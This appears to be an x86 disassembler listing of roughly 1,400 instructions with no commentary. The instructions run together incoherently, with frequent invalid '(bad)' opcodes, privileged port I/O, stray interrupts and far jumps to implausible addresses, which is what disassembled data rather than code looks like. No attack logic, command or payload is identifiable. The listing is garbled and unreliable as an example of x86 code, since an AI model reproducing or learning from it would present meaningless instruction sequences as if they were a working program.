  42388e:	sub    eax,DWORD PTR [esi]
  423890:	cs jp  0x4238e7
  423893:	test   DWORD PTR [eax-0x430cd42f],eax
  423899:	and    al,0xe5
  42389b:	sahf   
  42389c:	lea    ebx,[edi]
  42389e:	sub    eax,0x5321638f
  4238a3:	and    ah,0xee
  4238a6:	dec    ebx
  4238a7:	test   al,0xee
  4238a9:	push   ss
  4238aa:	and    ecx,DWORD PTR [ebx-0x5fe6c49f]
  4238b0:	cmp    ebp,DWORD PTR [edx+0x125e3d56]
  4238b6:	aam    0x60
  4238b8:	ret    
  4238b9:	call   0xa9e00e6
  4238be:	or     BYTE PTR [ebx],dh
  4238c0:	inc    ebp
  4238c1:	adc    al,0x23
  4238c3:	fsub   st,st(0)
  4238c5:	fwait
  4238c6:	sub    edx,DWORD PTR [esi]
  4238c8:	aad    0x21
  4238ca:	mov    ebx,0x89ed23ed
  4238cf:	daa    
  4238d0:	mov    ch,0x9d
  4238d2:	pop    ss
  4238d3:	push   esp
  4238d4:	push   ds
  4238d5:	push   ebp
  4238d6:	sbb    DWORD PTR [ecx],esp
  4238d8:	(bad)  
  4238da:	jne    0x423924
  4238dc:	jmp    0x5c6a:0xec697839
  4238e3:	pushf  
  4238e4:	xchg   esi,eax
  4238e5:	(bad)  
  4238e6:	stos   DWORD PTR es:[edi],eax
  4238e7:	xlat   BYTE PTR ds:[ebx]
  4238e8:	sbb    eax,0x90d37b14
  4238ed:	mov    bh,0xef
  4238ef:	cmp    al,0xd0
  4238f1:	push   0x980126c9
  4238f6:	xchg   esp,eax
  4238f7:	bound  edi,QWORD PTR [eax]
  4238f9:	clc    
  4238fa:	icebp  
  4238fb:	pop    ebx
  4238fc:	jbe    0x423923
  4238fe:	cdq    
  4238ff:	add    al,0xdd
  423901:	push   ebp
  423902:	xchg   edx,eax
  423903:	fnstsw WORD PTR [ecx-0x36b812c9]
  423909:	mov    bl,ch
  42390b:	mov    eax,ebp
  42390d:	adc    eax,0xb6bf610b
  423912:	mov    BYTE PTR [ebx],0xc3
  423915:	pop    es
  423916:	cld    
  423917:	cmp    eax,0x6c3379ce
  42391c:	cli    
  42391d:	popf   
  42391e:	jne    0x423905
  423920:	xor    al,0x40
  423922:	jno    0x42394c
  423924:	push   0xffffff96
  423926:	push   esi
  423927:	and    al,0x31
  423929:	mov    ds:0x6aa0493,al
  42392e:	xchg   BYTE PTR [esp+edx*2-0x4a],dl
  423932:	out    0x69,al
  423934:	test   BYTE PTR [ebx-0x567d805],bl
  42393a:	jae    0x4238d4
  42393c:	add    ecx,DWORD PTR [ebp+esi*8-0x26]
  423940:	dec    esp
  423941:	loop   0x423992
  423943:	out    dx,al
  423944:	popf   
  423945:	cli    
  423946:	sbb    eax,0xfa7b0df5
  42394b:	cmp    bl,al
  42394d:	xor    al,0x5a
  42394f:	sbb    DWORD PTR [esi],esp
  423951:	sar    DWORD PTR [edi],0x44
  423954:	repz push eax
  423956:	fucomp st(2)
  423958:	fcomp  QWORD PTR [eax+0x4f76c168]
  42395e:	sahf   
  42395f:	or     ah,dh
  423961:	pop    ds
  423962:	pop    eax
  423963:	repz das 
  423965:	push   cs
  423966:	pop    eax
  423967:	jmp    0x27f32256
  42396c:	outs   dx,BYTE PTR ds:[esi]
  42396d:	sub    BYTE PTR [esi-0x79],0xb1
  423971:	pmaxsw mm2,mm1
  423974:	cs in  eax,dx
  423976:	mov    ah,BYTE PTR [ecx-0x2ed22bff]
  42397c:	sub    BYTE PTR [esi+0x6a],bh
  42397f:	xchg   ecx,eax
  423980:	sti    
  423981:	stc    
  423982:	int    0x2d
  423984:	add    BYTE PTR [ecx+ecx*2-0x23],cl
  423988:	jo     0x42393a
  42398a:	(bad)  
  42398b:	mov    ch,0xed
  42398d:	mov    WORD PTR [ebx+0x2c283d7c],?
  423993:	popa   
  423994:	sbb    eax,0x33089009
  423999:	mov    esi,0x7568c146
  42399e:	push   0xffffffa5
  4239a0:	push   edi
  4239a1:	jae    0x42395c
  4239a3:	call   0xe19674e2
  4239a8:	test   BYTE PTR [ebp+0x65],bh
  4239ab:	scas   eax,DWORD PTR es:[edi]
  4239ac:	(bad)  
  4239ae:	add    BYTE PTR [ecx-0x1b8cee17],cl
  4239b4:	push   ebp
  4239b5:	and    esp,DWORD PTR [esi-0x70b72e38]
  4239bb:	repz inc bx
  4239be:	data16 daa 
  4239c0:	scas   al,BYTE PTR es:[edi]
  4239c1:	push   ebx
  4239c2:	and    eax,0xa2319c15
  4239c7:	imul   ebx,edx,0x38
  4239ca:	push   esi
  4239cb:	cmc    
  4239cc:	mov    DWORD PTR [ecx+0x78],ebx
  4239cf:	mov    eax,ds:0x854eca66
  4239d4:	mov    ah,0x30
  4239d6:	adc    ebx,DWORD PTR [ebp-0x50d134d4]
  4239dc:	or     ebp,DWORD PTR [ebx+0x59]
  4239df:	or     edi,DWORD PTR [edi-0x298d727b]
  4239e5:	mov    DWORD PTR [ebp+0x68],edi
  4239e8:	popa   
  4239e9:	dec    ebx
  4239ea:	cmc    
  4239eb:	jge    0x423992
  4239ed:	ret    0xba9d
  4239f0:	and    DWORD PTR [ebx-0x52b69f91],edx
  4239f6:	fidivr WORD PTR [eax-0x9bf779c]
  4239fc:	test   BYTE PTR [ecx+0x53b4a821],0x20
  423a03:	and    eax,0xc511e390
  423a08:	into   
  423a09:	mov    dh,0x7c
  423a0b:	jno    0x423a51
  423a0d:	fisub  WORD PTR [ecx-0x57751b9c]
  423a13:	cmp    DWORD PTR [ebx+0x47959610],edx
  423a19:	push   cs
  423a1a:	outs   dx,BYTE PTR ds:[esi]
  423a1b:	arpl   WORD PTR [edx],cx
  423a1d:	imul   eax,DWORD PTR [eax-0x2561d721],0x75
  423a24:	jge    0x423a37
  423a26:	fwait
  423a27:	xor    BYTE PTR [eax-0x26233682],dh
  423a2d:	test   eax,0xddffeef7
  423a33:	and    al,0x1
  423a35:	pop    ebp
  423a36:	dec    edi
  423a37:	rcr    edi,cl
  423a39:	inc    eax
  423a3a:	ja     0x423a3b
  423a3c:	in     al,0x1
  423a3e:	add    al,ch
  423a40:	add    DWORD PTR [eax],eax
  423a42:	add    cl,bh
  423a44:	pop    es
  423a45:	jo     0x4239cc
  423a47:	xor    eax,0x5bdf64f6
  423a4c:	rol    ch,1
  423a4e:	rcl    ecx,1
  423a50:	mov    ebp,0x667268c0
  423a55:	xor    al,0x9c
  423a57:	inc    edi
  423a58:	imul   ecx,DWORD PTR es:[edx],0xffffffb4
  423a5c:	push   edi
  423a5d:	aaa    
  423a5e:	cmp    DWORD PTR [edi],eax
  423a60:	xchg   ebx,eax
  423a61:	repz push ebp
  423a63:	adc    DWORD PTR ds:0x1e82c26d,ebp
  423a69:	aad    0xdb
  423a6b:	sbb    eax,0x615bffbf
  423a70:	dec    eax
  423a71:	sbb    dl,BYTE PTR [ebp-0x204bdcf]
  423a77:	inc    edx
  423a78:	stc    
  423a79:	inc    esi
  423a7a:	xchg   ebx,eax
  423a7b:	fdiv   DWORD PTR ds:0x7ad6718d
  423a81:	push   ebx
  423a82:	fsubr  DWORD PTR ds:0xb8009a2b
  423a88:	push   esi
  423a89:	fnstsw WORD PTR [ebx-0x5f909a3b]
  423a8f:	les    esi,FWORD PTR [edx-0x1e]
  423a92:	shl    DWORD PTR [esi+0x4aa704be],cl
  423a98:	test   al,0x55
  423a9a:	fadd   DWORD PTR ds:0x312f4eed
  423aa0:	mov    ds:0xfe777160,eax
  423aa5:	add    eax,DWORD PTR ds:0xa77d2d24
  423aab:	out    0xb2,al
  423aad:	or     ebx,DWORD PTR [ecx-0x7c]
  423ab0:	ja     0x423a77
  423ab2:	adc    BYTE PTR [ecx-0x3a],0x5c
  423ab6:	jp     0x423af6
  423ab8:	rcr    BYTE PTR [esi],0xf3
  423abb:	addr16 dec ecx
  423abd:	push   ss
  423abe:	jp     0x423a85
  423ac0:	jle    0x423aec
  423ac2:	dec    edx
  423ac3:	push   eax
  423ac4:	faddp  st(1),st
  423ac6:	sbb    eax,DWORD PTR [ebx+0x48]
  423ac9:	cmp    esi,ecx
  423acb:	scas   al,BYTE PTR es:[edi]
  423acc:	mov    ebx,0x4eab7300
  423ad1:	retf   
  423ad2:	(bad)  
  423ad3:	xor    al,0xb0
  423ad5:	mov    ah,BYTE PTR [edi]
  423ad7:	adc    DWORD PTR [ebp-0x80],esp
  423ada:	daa    
  423adb:	out    dx,eax
  423adc:	lods   eax,DWORD PTR ds:[esi]
  423add:	mov    eax,ds:0xe19f6e13
  423ae2:	xchg   ebx,eax
  423ae3:	jno    0x423b21
  423ae5:	pop    ds
  423ae6:	pop    es
  423ae7:	mov    WORD PTR [edx+0xc549f2f],gs
  423aed:	mov    ecx,0xb519c3c5
  423af2:	in     al,dx
  423af3:	fadd   DWORD PTR [ebp-0x9de5337]
  423af9:	xchg   ebp,eax
  423afa:	mov    bl,0xc3
  423afc:	pusha  
  423afd:	pop    ss
  423afe:	in     al,0x3e
  423b00:	ins    BYTE PTR es:[edi],dx
  423b01:	daa    
  423b02:	cmc    
  423b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b04:	ss icebp 
  423b06:	xor    edx,ecx
  423b08:	pop    esp
  423b09:	mov    al,0x1a
  423b0b:	stos   BYTE PTR es:[edi],al
  423b0c:	test   BYTE PTR [edx+0x73],cl
  423b0f:	dec    edx
  423b10:	aaa    
  423b11:	jmp    DWORD PTR [ebx+0xe2263ca]
  423b17:	mov    esi,esi
  423b19:	cld    
  423b1a:	fist   WORD PTR [edi]
  423b1c:	push   ds
  423b1d:	sub    BYTE PTR [esi+0x14],dl
  423b20:	ins    BYTE PTR es:[edi],dx
  423b21:	cdq    
  423b22:	into   
  423b23:	dec    edi
  423b24:	pop    ss
  423b25:	daa    
  423b26:	mov    BYTE PTR [edx-0x50b6c5b5],0xcd
  423b2d:	cmp    ebp,DWORD PTR [ebx+0x15c0c3e6]
  423b33:	xchg   DWORD PTR [eax+0x70f28386],ebp
  423b39:	das    
  423b3a:	sub    dl,cl
  423b3c:	mov    eax,0xd69554fe
  423b41:	aas    
  423b42:	mov    ecx,DWORD PTR [edi]
  423b44:	sub    eax,0x27be3316
  423b49:	pop    ebx
  423b4a:	into   
  423b4b:	inc    edi
  423b4c:	push   eax
  423b4d:	icebp  
  423b4e:	jg     0x423b9f
  423b50:	mov    esi,0x7681b866
  423b55:	lds    ebx,FWORD PTR [edx-0x5fe18967]
  423b5b:	retf   
  423b5c:	sub    eax,0x5290024a
  423b61:	leave  
  423b62:	fdivr  DWORD PTR [ecx+0x1f]
  423b65:	xor    BYTE PTR [edx],cl
  423b67:	xor    al,0x19
  423b69:	xor    BYTE PTR [ebx],dh
  423b6b:	aam    0x68
  423b6d:	mov    bh,0x26
  423b6f:	ja     0x423b2e
  423b71:	jle    0x423b72
  423b73:	mov    ?,WORD PTR [eax+edx*1-0x25]
  423b77:	int3   
  423b78:	dec    ebx
  423b79:	out    dx,eax
  423b7a:	sti    
  423b7b:	lods   al,BYTE PTR ds:[esi]
  423b7c:	cmp    DWORD PTR ds:[edx],edi
  423b7f:	adc    dl,BYTE PTR [ebx]
  423b81:	sbb    BYTE PTR [eax-0x74],bh
  423b84:	fdivr  st(1),st
  423b86:	bound  ecx,QWORD PTR [ebp-0x17]
  423b89:	bound  esi,QWORD PTR [esi-0x14]
  423b8c:	or     al,0x5b
  423b8e:	mov    WORD PTR ss:[ecx],ds
  423b91:	lea    esp,[ebx]
  423b93:	daa    
  423b94:	pop    ebx
  423b95:	jp     0x423b6b
  423b97:	popa   
  423b98:	inc    ebx
  423b99:	push   0xffffff90
  423b9b:	retf   
  423b9c:	mov    al,ds:0xbd6a2b98
  423ba1:	hlt    
  423ba2:	ins    DWORD PTR es:[edi],dx
  423ba3:	aam    0x3f
  423ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba6:	hlt    
  423ba7:	jge    0x423bfc
  423ba9:	adc    BYTE PTR [edi-0x4444e0b9],al
  423baf:	jae    0x423b93
  423bb1:	inc    esp
  423bb2:	scas   al,BYTE PTR es:[edi]
  423bb3:	adc    esp,DWORD PTR [eiz*1+0x6f4d0858]
  423bba:	inc    ebx
  423bbb:	push   ss
  423bbc:	jecxz  0x423c31
  423bbe:	push   edi
  423bbf:	pop    ds
  423bc0:	and    BYTE PTR [eax-0x78],dh
  423bc3:	cli    
  423bc4:	es jb  0x423c34
  423bc7:	loope  0x423c10
  423bc9:	and    al,0x28
  423bcb:	xchg   esi,eax
  423bcc:	sub    ebp,edx
  423bce:	sbb    al,0x0
  423bd0:	sub    al,0xfb
  423bd2:	jno    0x423ba7
  423bd4:	inc    esi
  423bd5:	icebp  
  423bd6:	jecxz  0x423bf0
  423bd8:	aas    
  423bd9:	sbb    esi,edi
  423bdb:	mov    ds,WORD PTR [esp+edx*2+0x13]
  423bdf:	jb     0x423b81
  423be1:	dec    esi
  423be2:	dec    esp
  423be3:	(bad)  
  423be4:	test   DWORD PTR [esi+0x1d5b5b64],0x1c15b81e
  423bee:	cmp    dl,BYTE PTR [edi-0x2d580f3b]
  423bf4:	jecxz  0x423c64
  423bf6:	push   edx
  423bf7:	mov    ch,0xfc
  423bf9:	pop    edx
  423bfa:	xchg   esp,eax
  423bfb:	and    BYTE PTR [eax],dh
  423bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bfe:	test   BYTE PTR [ebx+0x6f],al
  423c01:	sbb    eax,0x2e4f9f1f
  423c06:	in     al,dx
  423c07:	inc    esp
  423c08:	je     0x423c23
  423c0a:	xchg   ecx,eax
  423c0b:	pop    edx
  423c0c:	cmp    DWORD PTR [eax+0x30253825],ebx
  423c12:	ror    BYTE PTR [edx],cl
  423c14:	cmp    al,dl
  423c16:	test   DWORD PTR [ecx+0x43dd0309],edi
  423c1c:	cmp    al,BYTE PTR [ecx+0x31]
  423c1f:	and    eax,0x78f4370c
  423c24:	loope  0x423ba6
  423c26:	js     0x423c9d
  423c28:	xor    DWORD PTR [ecx],ebp
  423c2a:	mov    BYTE PTR [edi-0x5e],ch
  423c2d:	aam    0x2a
  423c2f:	fnstsw WORD PTR [esi-0x1]
  423c32:	out    0x52,eax
  423c34:	fcmovu st,st(5)
  423c36:	in     eax,0xab
  423c38:	addr16 jne 0x423c5e
  423c3b:	out    0xe6,eax
  423c3d:	add    DWORD PTR [eax],eax
  423c3f:	call   0xf4423c45
  423c44:	mov    bl,0x45
  423c46:	rcr    BYTE PTR [ebx],0x82
  423c49:	add    eax,0xb5be13e3
  423c4e:	retf   
  423c4f:	not    bh
  423c51:	test   BYTE PTR [ebx-0x57],bl
  423c54:	(bad)  
  423c55:	out    dx,eax
  423c56:	int    0x1b
  423c58:	push   cs
  423c59:	(bad)  
  423c5a:	push   ebx
  423c5b:	adc    DWORD PTR [edx+0x6b],0x7d
  423c5f:	lahf   
  423c60:	mov    fs,WORD PTR [ecx]
  423c62:	push   esp
  423c63:	clc    
  423c64:	xchg   DWORD PTR [esi-0x503c58bc],eax
  423c6a:	inc    ebx
  423c6b:	xchg   ecx,eax
  423c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c6d:	inc    edx
  423c6e:	xor    bh,BYTE PTR [ebp+0x66]
  423c71:	test   DWORD PTR [ecx-0x2d],esi
  423c74:	xchg   esp,eax
  423c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c76:	in     eax,0xcf
  423c78:	je     0x423ca4
  423c7a:	inc    esi
  423c7b:	fsub   st,st(6)
  423c7d:	adc    eax,0xc319b757
  423c82:	xor    bh,BYTE PTR [ebx+0x1]
  423c85:	jmp    0x5373:0xaeb9376d
  423c8c:	mov    eax,0x2ef9769c
  423c91:	dec    ebx
  423c92:	cmp    bh,BYTE PTR [eax+0x2a5fda4]
  423c98:	mov    ebx,0x6b4e4bb7
  423c9d:	jmp    0x423c57
  423c9f:	in     al,0x93
  423ca1:	fwait
  423ca2:	push   ebx
  423ca3:	nop
  423ca4:	add    BYTE PTR [esi-0x52103af7],al
  423caa:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  423cac:	sub    bh,dl
  423cae:	js     0x423c74
  423cb0:	iret   
  423cb1:	push   0xe097979f
  423cb6:	mov    ebx,ebx
  423cb8:	mov    dl,0xea
  423cba:	clc    
  423cbb:	out    dx,al
  423cbc:	xchg   ecx,eax
  423cbd:	lods   al,BYTE PTR ds:[esi]
  423cbe:	ss push esi
  423cc0:	pop    ebx
  423cc1:	cmp    ch,cl
  423cc3:	sbb    ebp,DWORD PTR [edx-0x69]
  423cc6:	test   ebx,0x544f0c3
  423ccc:	sahf   
  423ccd:	jecxz  0x423d02
  423ccf:	out    dx,eax
  423cd0:	aas    
  423cd1:	jle    0x423cc8
  423cd3:	nop
  423cd4:	ss xor eax,0x5d88049c
  423cda:	out    0x3,eax
  423cdc:	jp     0x423d43
  423cde:	push   esi
  423cdf:	adc    DWORD PTR [esi],edi
  423ce1:	jb     0x423ce3
  423ce3:	inc    ebp
  423ce4:	cli    
  423ce5:	sbb    ah,BYTE PTR [esi]
  423ce7:	mov    ebx,0xdd5aeb7f
  423cec:	jb     0x423ced
  423cee:	jae    0x423d42
  423cf0:	icebp  
  423cf1:	ret    0xabbd
  423cf4:	dec    ecx
  423cf5:	mov    esp,0x24233b53
  423cfa:	popf   
  423cfb:	aaa    
  423cfc:	cmp    DWORD PTR [ebp+0x70],0xc0a7891f
  423d03:	gs push es
  423d05:	adc    DWORD PTR [eax],edx
  423d07:	jo     0x423d1b
  423d09:	pushf  
  423d0a:	out    dx,al
  423d0b:	arpl   WORD PTR [esp+ebx*1-0x66],dx
  423d0f:	add    BYTE PTR [edi],dl
  423d11:	inc    BYTE PTR [eax+0x82058b7]
  423d17:	add    al,0x6f
  423d19:	fs das 
  423d1b:	push   ebx
  423d1c:	cmp    edi,DWORD PTR [edx]
  423d1e:	jle    0x423d7a
  423d20:	dec    edi
  423d21:	xor    bh,bh
  423d23:	not    DWORD PTR [ecx+0x16ec56f3]
  423d29:	and    DWORD PTR [ebx+ebp*1],eax
  423d2c:	inc    ecx
  423d2d:	retf   0x7e77
  423d30:	push   ecx
  423d31:	pop    esi
  423d32:	(bad)  
  423d33:	fidiv  WORD PTR [ecx]
  423d35:	push   ecx
  423d36:	push   cs
  423d37:	loopne 0x423d94
  423d39:	inc    edi
  423d3a:	rcl    BYTE PTR [eax],0x12
  423d3d:	arpl   dx,ax
  423d3f:	sbb    ah,BYTE PTR [eax-0x21495ea6]
  423d45:	in     eax,dx
  423d46:	dec    ebp
  423d47:	mov    dl,0x2e
  423d49:	mov    ch,0x99
  423d4b:	xchg   BYTE PTR ds:[esi-0x1a],al
  423d4f:	cmc    
  423d50:	pusha  
  423d51:	neg    bh
  423d53:	clc    
  423d54:	and    DWORD PTR [edx+0x6b],edi
  423d57:	adc    BYTE PTR [edi-0x3b991e51],dh
  423d5d:	scas   al,BYTE PTR es:[edi]
  423d5e:	cmp    al,0xfd
  423d60:	int    0x7
  423d62:	inc    ebx
  423d63:	ss mov esp,0x93b694a9
  423d69:	leave  
  423d6a:	(bad)  
  423d6c:	xchg   ebx,eax
  423d6d:	loop   0x423d35
  423d6f:	je     0x423d8f
  423d71:	cdq    
  423d72:	test   DWORD PTR [edx+0x68],edi
  423d75:	jbe    0x423d83
  423d77:	int    0x4
  423d79:	fstp   DWORD PTR [ecx-0x6]
  423d7c:	xor    BYTE PTR [ebx],bl
  423d7e:	in     al,dx
  423d7f:	arpl   dx,dx
  423d81:	int3   
  423d82:	jne    0x423de5
  423d84:	data16 add al,0x18
  423d87:	add    DWORD PTR [ebp-0x5815b307],ecx
  423d8d:	arpl   WORD PTR [esi],dx
  423d8f:	add    DWORD PTR [esp+eiz*2-0x60],edx
  423d93:	add    eax,DWORD PTR [eax-0x9]
  423d96:	test   eax,0x2fe1c69e
  423d9b:	push   cs
  423d9c:	jns    0x423df8
  423d9e:	mov    ebx,0x41d33579
  423da3:	ins    BYTE PTR es:[edi],dx
  423da4:	xlat   BYTE PTR ds:[ebx]
  423da5:	cmp    DWORD PTR [eax],eax
  423da7:	and    eax,0xfd3f7653
  423dac:	push   ecx
  423dad:	xchg   DWORD PTR [ecx+0x5236a2f9],ebx
  423db3:	outs   dx,BYTE PTR ds:[esi]
  423db4:	inc    ebx
  423db5:	jmp    0x62130ee8
  423dba:	fst    DWORD PTR [edx]
  423dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dbd:	cmp    ecx,DWORD PTR [ebp+0x59]
  423dc0:	push   ss
  423dc1:	cmp    ebp,DWORD PTR [edx]
  423dc3:	aad    0x4b
  423dc5:	in     al,dx
  423dc6:	leave  
  423dc7:	stos   BYTE PTR es:[edi],al
  423dc8:	fcom   QWORD PTR fs:[ebx+0x505865cf]
  423dcf:	mov    al,BYTE PTR [ebx-0x4ffaf6a2]
  423dd5:	je     0x423dea
  423dd7:	mov    ebx,0x273e3d8f
  423ddc:	addr16 icebp 
  423dde:	aaa    
  423ddf:	mov    ?,WORD PTR ds:[eiz*4-0x294e105b]
  423de7:	cli    
  423de8:	jl     0x423e21
  423dea:	call   DWORD PTR [ebx-0x26f61cda]
  423df0:	adc    DWORD PTR [edi],eax
  423df2:	ins    BYTE PTR es:[edi],dx
  423df3:	inc    esi
  423df4:	sbb    eax,0xc5078258
  423df9:	ret    
  423dfa:	hlt    
  423dfb:	paddusw mm0,QWORD PTR [ecx]
  423dfe:	or     eax,0x32b5ca9b
  423e03:	add    dh,BYTE PTR [edi+esi*4]
  423e06:	ret    0x819c
  423e09:	add    ebp,esi
  423e0b:	or     al,0xaa
  423e0d:	dec    ebp
  423e0e:	cmp    eax,0xccf65984
  423e13:	cmp    eax,0xb13b3807
  423e18:	mov    al,ds:0xe197f8a1
  423e1d:	cmp    ebx,DWORD PTR [eax-0xbfaec41]
  423e23:	or     DWORD PTR ds:0xd04298ba,ecx
  423e29:	lds    ecx,FWORD PTR [edi+0x46c01af9]
  423e2f:	jecxz  0x423e0f
  423e31:	(bad)  
  423e32:	mov    edi,0xe1f1bc83
  423e37:	das    
  423e38:	out    0xd7,eax
  423e3a:	xor    cl,bh
  423e3c:	call   0x22a3e42
  423e41:	add    BYTE PTR [eax],al
  423e43:	stos   DWORD PTR es:[edi],eax
  423e44:	outs   dx,BYTE PTR ds:[esi]
  423e45:	mov    edi,0x276d00aa
  423e4a:	mov    dh,0xf1
  423e4c:	push   eax
  423e4d:	fcomp  QWORD PTR [edx]
  423e4f:	xor    esp,0xffffffd0
  423e52:	aas    
  423e53:	les    esi,FWORD PTR [ebp-0x76aae809]
  423e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e5a:	cld    
  423e5b:	jmp    0x423e09
  423e5d:	aaa    
  423e5e:	cli    
  423e5f:	pop    esi
  423e60:	scas   eax,DWORD PTR es:[edi]
  423e61:	int3   
  423e62:	fwait
  423e63:	aam    0x8b
  423e65:	das    
  423e66:	mov    esp,DWORD PTR [edx+ebx*1-0x57]
  423e6a:	fwait
  423e6b:	mov    cl,bh
  423e6d:	gs loopne 0x423eb6
  423e70:	repnz mov edx,0xd948a051
  423e76:	ins    BYTE PTR es:[edi],dx
  423e77:	outs   dx,DWORD PTR ds:[esi]
  423e78:	cmpps  xmm5,xmm5,0xbd
  423e7c:	std    
  423e7d:	mov    DWORD PTR [edx+ebx*8],ecx
  423e80:	test   eax,0xeb494325
  423e85:	lea    esp,[ecx+0x1e18e8c5]
  423e8b:	mov    ah,0x78
  423e8d:	(bad)  
  423e8e:	pop    ds
  423e8f:	sbb    BYTE PTR [eax+0x9ea0c1],dl
  423e95:	loope  0x423eb2
  423e97:	mov    edi,esi
  423e99:	ret    0xd64
  423e9c:	jbe    0x423e68
  423e9e:	fadd   st,st(5)
  423ea0:	sbb    BYTE PTR [esi+edx*8],bh
  423ea3:	sahf   
  423ea4:	jbe    0x423edf
  423ea6:	aad    0x65
  423ea8:	adc    DWORD PTR [ebx+0xe1d92a5],0xffffffe6
  423eaf:	aaa    
  423eb0:	les    ebp,FWORD PTR [ecx-0x19a9d38d]
  423eb6:	and    BYTE PTR [esi+0xd],ch
  423eb9:	xchg   edi,eax
  423eba:	out    0xfa,eax
  423ebc:	jmp    0xc1e8ade1
  423ec1:	or     ch,al
  423ec3:	xchg   al,dl
  423ec5:	test   eax,0x27d58f9
  423eca:	jmp    0x423e71
  423ecc:	mov    dl,0x3c
  423ece:	mov    eax,ds:0x9ba2fbbf
  423ed3:	adc    BYTE PTR [eax-0x4861c793],dl
  423ed9:	fnstsw WORD PTR [ebx+0x6139f669]
  423edf:	jmp    0x423f02
  423ee1:	xor    al,0xcb
  423ee3:	div    BYTE PTR [eax+esi*2]
  423ee6:	pop    esi
  423ee7:	scas   al,BYTE PTR es:[edi]
  423ee8:	test   ebp,edi
  423eea:	arpl   WORD PTR [edx+ebx*2],bp
  423eed:	lahf   
  423eee:	cmp    al,0x37
  423ef0:	or     eax,0xb8955da4
  423ef5:	(bad)
  423ef8:	out    0xd1,al
  423efa:	pop    ebx
  423efb:	mov    esi,0xf7290008
  423f00:	pop    ds
  423f01:	sahf   
  423f02:	jnp    0x423ede
  423f04:	ds mov bl,0xa4
  423f07:	cli    
  423f08:	push   esp
  423f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f0a:	xchg   edi,eax
  423f0b:	mov    ebp,0x72e8247f
  423f10:	push   ds
  423f11:	fdiv   DWORD PTR [edx]
  423f13:	data16 xlat BYTE PTR ds:[ebx]
  423f15:	pop    ds
  423f16:	sbb    al,0xd4
  423f18:	jp     0x423f3a
  423f1a:	test   DWORD PTR [ebx+esi*4-0x5],ebp
  423f1e:	jg     0x423f8a
  423f20:	and    DWORD PTR [ebp+0x2f],ecx
  423f23:	jl     0x423f19
  423f25:	mov    bh,0x14
  423f27:	adc    bl,BYTE PTR [ecx]
  423f29:	(bad)  
  423f2a:	enter  0x48d8,0xc7
  423f2e:	scas   al,BYTE PTR es:[edi]
  423f2f:	sbb    eax,0x6e3c39ff
  423f34:	call   0x26d85a6c
  423f39:	sbb    BYTE PTR [edx-0x67],ah
  423f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f3d:	int3   
  423f3e:	mov    ebp,DWORD PTR [esi+0x51]
  423f41:	outs   dx,DWORD PTR ds:[esi]
  423f42:	xchg   ecx,eax
  423f43:	ins    DWORD PTR es:[edi],dx
  423f44:	shr    DWORD PTR [esi-0x20],1
  423f47:	or     dl,al
  423f49:	pop    ebx
  423f4a:	or     ch,ch
  423f4c:	lods   al,BYTE PTR ds:[esi]
  423f4d:	add    ecx,DWORD PTR [esp+eiz*2-0x59]
  423f51:	sub    ch,ch
  423f53:	or     BYTE PTR [eax+0x4],0x6b
  423f57:	pop    esi
  423f58:	nop
  423f59:	jge    0x423fbb
  423f5b:	(bad)  
  423f5c:	xchg   ebx,eax
  423f5d:	ds (bad) 
  423f5f:	shl    DWORD PTR [ecx],cl
  423f61:	mov    eax,ds:0x301eb860
  423f66:	inc    esp
  423f67:	or     edx,DWORD PTR [edx+edx*2-0x2b]
  423f6b:	dec    esi
  423f6c:	push   edx
  423f6d:	jb     0x423fca
  423f6f:	push   edi
  423f70:	sub    bh,BYTE PTR [esp+eax*4-0x6d]
  423f74:	lods   eax,DWORD PTR ds:[esi]
  423f75:	ret    
  423f76:	mov    eax,ds:0xce36ac60
  423f7b:	mov    eax,0x283e4e62
  423f80:	sbb    eax,0xb13b4a91
  423f85:	xchg   BYTE PTR [ebx-0x4837f345],bh
  423f8b:	pusha  
  423f8c:	frstor [ecx-0x50]
  423f8f:	or     ebx,DWORD PTR [ebx]
  423f91:	(bad)
  423f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f96:	cld    
  423f97:	sbb    DWORD PTR [edx+eax*1-0x18],esp
  423f9b:	sub    eax,0xa0b30db0
  423fa0:	mov    esp,0x2eaf64ad
  423fa5:	outs   dx,DWORD PTR ds:[esi]
  423fa6:	sub    ebx,DWORD PTR [ecx+0x7a]
  423fa9:	xor    DWORD PTR [ecx-0x7dbddab9],0x4c
  423fb0:	sar    ch,cl
  423fb2:	sub    BYTE PTR gs:[ebp+0xd],bh
  423fb6:	lods   eax,DWORD PTR ds:[esi]
  423fb7:	in     eax,0x98
  423fb9:	sub    BYTE PTR [ebp-0x2e],dh
  423fbc:	aas    
  423fbd:	daa    
  423fbe:	xlat   BYTE PTR ds:[ebx]
  423fbf:	mov    cl,0xe8
  423fc1:	sti    
  423fc2:	adc    dh,BYTE PTR [esi-0x6507b216]
  423fc8:	inc    esi
  423fc9:	test   DWORD PTR [ebx-0x6b],ecx
  423fcc:	aas    
  423fcd:	lock sub eax,0x36cb35b0
  423fd3:	xchg   ebp,eax
  423fd4:	mov    eax,0xcd089683
  423fd9:	mov    ebx,0xd132c424
  423fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fdf:	push   edi
  423fe0:	push   0xa
  423fe2:	call   0xf579:0xac1fb5e2
  423fe9:	add    eax,0x28925ac7
  423fee:	adc    ebx,DWORD PTR gs:[esi-0x68]
  423ff2:	add    bl,dh
  423ff4:	sub    eax,0x957c1bfb
  423ff9:	loope  0x423fdf
  423ffb:	nop
  423ffc:	(bad)  
  423ffd:	scas   al,BYTE PTR es:[edi]
  423ffe:	les    ecx,FWORD PTR [eax]
  424000:	jecxz  0x42404e
  424002:	test   eax,0x645793b0
  424007:	div    BYTE PTR [esi+0x76]
  42400a:	lahf   
  42400b:	(bad)  
  42400c:	sbb    DWORD PTR [ebx+0x4e],esi
  42400f:	or     dh,BYTE PTR [edi]
  424011:	es cld 
  424013:	jae    0x424021
